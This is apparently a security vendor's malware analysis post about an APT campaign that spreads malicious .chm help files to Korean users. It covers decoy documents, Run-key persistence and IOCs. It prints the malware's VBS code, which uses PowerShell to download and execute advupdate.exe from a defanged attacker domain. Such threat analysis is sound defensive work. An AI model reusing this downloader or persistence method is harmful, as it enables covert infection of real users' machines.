<div>
Posted on <a href="https://asec.ahnlab.com/en/32800/" rel="bookmark" title="11:03 am">March 22, 2022</a>
<h1 class="title">APT Attack Being Distributed as Windows Help File (*.chm)</h1>
<p>The ASEC analysis team has recently discovered the distribution of malware disguised as a Windows Help File (*.chm), specifically targeting Korean users. The CHM file is a compiled HTML Help file that is executed via the Microsoft® HTML help executable program.</p>
<p>The recently discovered CHM file downloads additional malicious files when run. A window that contains ordinary content is shown during this process, tricking the user into thinking that the file may not be malicious.</p>
<p>The malware is compressed and distributed as an email attachment as shown in the figure below.</p>
<figure class="aligncenter"><img alt="" class="wp-image-32688 jetpack-lazy-image jetpack-lazy-image--handled" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/eml%EC%88%98%EC%A0%95.png?resize=1024%2C609&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" class="wp-image-32688" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/eml%EC%88%98%EC%A0%95.png?resize=1024%2C609&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 1. Distributed email</figcaption></figure>
<p>The attached compressed file contains a Word file and a RAR file. Inside the RAR file, there exists the malicious file, Guide.chm.</p>
<figure class="aligncenter"><img alt="" class="wp-image-32689 jetpack-lazy-image jetpack-lazy-image--handled" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/zip_%EC%9E%90%EB%A3%8Czip.png?resize=984%2C454&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" class="wp-image-32689" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/zip_%EC%9E%90%EB%A3%8Czip.png?resize=984%2C454&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 2. Compressed file</figcaption></figure>
<figure class="aligncenter"><img alt="" class="wp-image-32746 jetpack-lazy-image jetpack-lazy-image--handled" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/folder_%EC%B5%9C%EC%8B%A0%EC%9E%90%EB%A3%8C-1.png?resize=1024%2C455&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" class="wp-image-32746" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/folder_%EC%B5%9C%EC%8B%A0%EC%9E%90%EB%A3%8C-1.png?resize=1024%2C455&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 3. .chm file that exists inside ‘Latest Info (Guide).rar’</figcaption></figure>
<p>Word file is encrypted, preventing the user from knowing what is inside the file. It is assumed that the content is designed to prompt the user into running the CHM file inside the same compressed file.</p>
<figure class="aligncenter"><img alt="" class="wp-image-32692 jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/doc_%EC%9E%90%EB%A3%8C-%EB%B3%B4%EC%8B%9C%EA%B3%A0-%ED%9A%8C%EC%8B%A0-%EB%B6%80%ED%83%81%EB%93%9C%EB%A6%BD%EB%8B%88%EB%8B%A4.png?resize=1024%2C778&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" class="wp-image-32692" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/doc_%EC%9E%90%EB%A3%8C-%EB%B3%B4%EC%8B%9C%EA%B3%A0-%ED%9A%8C%EC%8B%A0-%EB%B6%80%ED%83%81%EB%93%9C%EB%A6%BD%EB%8B%88%EB%8B%A4.png?resize=1024%2C778&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 4. Word file</figcaption></figure>
<p>Upon running Guide.chm, the following help appears. The content of this help is identical to the one found in <a href="https://mage.github.io/mage/">https://mage.github.io/mage/</a>.</p>
<figure class="aligncenter"><img alt="" class="wp-image-32694 jetpack-lazy-image" height="644" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/chm_guide2.png?resize=1024%2C619&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1066"/><img alt="" class="wp-image-32694" height="644" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/chm_guide2.png?resize=1024%2C619&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1066"/><figcaption>Figure 5. Created help</figcaption></figure>
<p>Inside the CHM file, there is a special command that exists inside the MAGE User Guide.html file. This command is automatically run via the shortcut.Click(); function.</p>
<figure class="aligncenter"><img alt="" class="wp-image-32695 jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/chm-%EB%82%B4%EB%B6%80.png?resize=1024%2C277&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" class="wp-image-32695" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/chm-%EB%82%B4%EB%B6%80.png?resize=1024%2C277&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 6. Code inside MAGE User Guide.html</figcaption></figure>
<p>Once the command is run, Document.dat and Document.vbs are created inside the %USERPROFILE%\Links\ folder. Document.dat contains Base64-encoded data, and the decoded data is saved into Document.vbs.</p>
<figure class="aligncenter"><img alt="" class="wp-image-32747 jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/vbs%EC%83%9D%EC%84%B1-1.png?resize=1024%2C414&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" class="wp-image-32747" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/vbs%EC%83%9D%EC%84%B1-1.png?resize=1024%2C414&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 7. Created script file</figcaption></figure>
<p>Afterward, it adds to the path HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Document so that the VBS file can be continuously run.</p>
<figure class="aligncenter"><img alt="" class="wp-image-32748 jetpack-lazy-image" height="382" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/reg-1.png?resize=1024%2C282&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1386"/><img alt="" class="wp-image-32748" height="382" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/reg-1.png?resize=1024%2C282&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="1386"/><figcaption>Figure 8. Created registry</figcaption></figure>
<p>Document.vbs contains a code that uses powershell to download an additional file as shown below. The downloaded file is saved into the %tmp% folder as advupdate.exe and is executed.</p>
<code class="language-js">Dim sh
Set sh=WScript.CreateObject("WScript.Shell")
sh.run "cmd /c powershell iwr -outf %tmp%\advupdate.exe hxxps://encorpost[.]com/post/post.php?type=1 &amp; start %tmp%\advupdate.exe",0,false
Set sh=Nothing</code>
<p>Currently, the file that is downloaded from the URL is an innocuous file, but users must remain cautious as malware with the same filename has been discovered.</p>
<p>The same kinds of malware so far discovered are as follows.</p>
<figure class="wp-block-table"><table><thead><tr><td>Name of Compressed File</td><td>Name of Malicious CHM File</td></tr></thead><tbody><tr><td>Document for court submission.zip</td><td>asset.chm</td></tr><tr><td>Contract paper.zip</td><td>contract.chm</td></tr><tr><td>wages.zip</td><td>wages.chm</td></tr><tr><td>document.zip</td><td>Nodejs for Game Server Development.chm</td></tr></tbody></table><figcaption>Table 1. Name of additionally found malicious files</figcaption></figure>
<p>‘Document for court submission.zip’ file, similar to files explained before, contains a document file and a RAR file.</p>
<figure class="aligncenter"><img alt="" class="wp-image-32701 jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/zip_%EB%B2%95%EC%9B%90%EC%A0%9C%EC%B6%9C%EC%9E%90%EB%A3%8Czip.png?resize=949%2C450&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" class="wp-image-32701" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/zip_%EB%B2%95%EC%9B%90%EC%A0%9C%EC%B6%9C%EC%9E%90%EB%A3%8Czip.png?resize=949%2C450&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 9. Additionally discovered malicious file 1-1</figcaption></figure>
<p>The CHM file is also disguised as an innocuous help file. The Excel file could also be opened and examined as it was not encrypted.</p>
<figure class="aligncenter"><img alt="" class="wp-image-32702 jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/%EC%A0%9C%EC%B6%9C%EC%9E%90%EB%A3%8C.png?resize=1024%2C389&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" class="wp-image-32702" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/%EC%A0%9C%EC%B6%9C%EC%9E%90%EB%A3%8C.png?resize=1024%2C389&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 10. Additionally discovered malicious file 1-2 (left: CHM file when run / right: Excel file when run)</figcaption></figure>
<p>The compressed file distributed under the filename Contract paper.zip contains two document files and a RAR compressed file (see figure below). Both of the Word files are encrypted, making it impossible to check what’s inside them. The CHM file is disguised as an innocuous help file that contains certain details.</p>
<figure class="aligncenter"><img alt="" class="wp-image-32705 jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/zip_%EA%B3%84%EC%95%BD%EC%84%9Czip.png?resize=949%2C450&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" class="wp-image-32705" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/zip_%EA%B3%84%EC%95%BD%EC%84%9Czip.png?resize=949%2C450&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 11. Additionally discovered malicious file 2-1</figcaption></figure>
<figure class="aligncenter"><img alt="" class="wp-image-32707 jetpack-lazy-image" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/%EA%B3%84%EC%95%BD%EC%84%9C.png?resize=1024%2C382&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><img alt="" class="wp-image-32707" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/%EA%B3%84%EC%95%BD%EC%84%9C.png?resize=1024%2C382&amp;ssl=1" style="max-width:80%;height:auto;width:auto;"/><figcaption>Figure 12. Additionally discovered malicious file 2-2 (Word file)</figcaption></figure>
<figure class="aligncenter"><img alt="" class="wp-image-32708 jetpack-lazy-image" height="723" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/chm_contract.png?resize=630%2C519&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="877"/><img alt="" class="wp-image-32708" height="723" src="https://i0.wp.com/asec.ahnlab.com/wp-content/uploads/2022/03/chm_contract.png?resize=630%2C519&amp;ssl=1" style="max-width:800px;height:auto;width:auto;" width="877"/><figcaption>Figure 13. Additionally discovered malicious file 2-3 (CHM file)</figcaption></figure>
<p>When the additionally discovered .chm files are run, script files are dropped into the %USERPROFILE%\Links\ folder and add run key. Afterward, when script files are run, additional malicious files are downloaded, saved into the %tmp% folder as advupdate.exe, and executed.</p>
<p>Below are the discovered download URLs.</p>
<figure class="wp-block-table"><table><thead><tr><td>Filename</td><td>Download URL</td></tr></thead><tbody><tr><td>Nodejs for Game Server Development.chm</td><td>hxxps://nhn-games[.]com/game03953/gamelist.php?type=1</td></tr><tr><td>wages.chm</td><td>hxxps://sktelecom[.]help/download/select.php?type=1</td></tr><tr><td>User Guide.chm</td><td>hxxps://sktelecom[.]help/download/select.php type=1</td></tr><tr><td>contract.chm</td><td>hxxps://want-helper[.]com/database/db.php?type=1</td></tr><tr><td>asset.chm</td><td>hxxps://want-helper[.]com/database/db.php?type=1</td></tr></tbody></table><figcaption>Table 2. Additional download URL</figcaption></figure>
<p>Recently, malicious Windows help files (*.chm) distributed in the form of compressed files are continuously being found. Seeing that the names of compressed files and interface of help files are written in Korean, it appears that the attackers are targeting Korean users. Currently, clicking the download URL results in an innocuous executable being downloaded, making it not possible to check what exactly the ultimately downloaded malware does. However, as the attacker may upload various malware strains to the URL, users must always take caution.</p>
<p>AhnLab’s anti-malware product, V3, detects the malware using the alias below.</p>
<p>[File Detection]
Trojan/CHM.Agent
Downloader/CHM.Agent</p>
<p>[IOC]
3ae6503e836b295955a828a76ce2efa7 (CHM)
d26481e376134dc14966ccab39b91f16 (CHM)
997165ed836b8a2a6af5cf2d43af5803 (CHM)
5f1091df4c74412ef59426c1bb65f4d0 (CHM)
ae43f4d4c6123294b2f3ede294032944 (CHM)
acc6263bd54de778c1e22373d73887ab (CHM)
hxxps://encorpost[.]com/post/post.php?type=1
hxxps://nhn-games[.]com/game03953/gamelist.php?type=1
hxxps://sktelecom[.]help/download/select.php?type=1
hxxps://want-helper[.]com/database/db.php?type=1</p>
<p>Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to check related IOC and detailed analysis information.</p>
<p>
Categories:<a href="https://asec.ahnlab.com/en/category/malware-information/" rel="category tag">Malware Information</a> </p>
<p>Tagged as:<a href="https://asec.ahnlab.com/tag/help/" rel="tag">Help</a></p>
</div>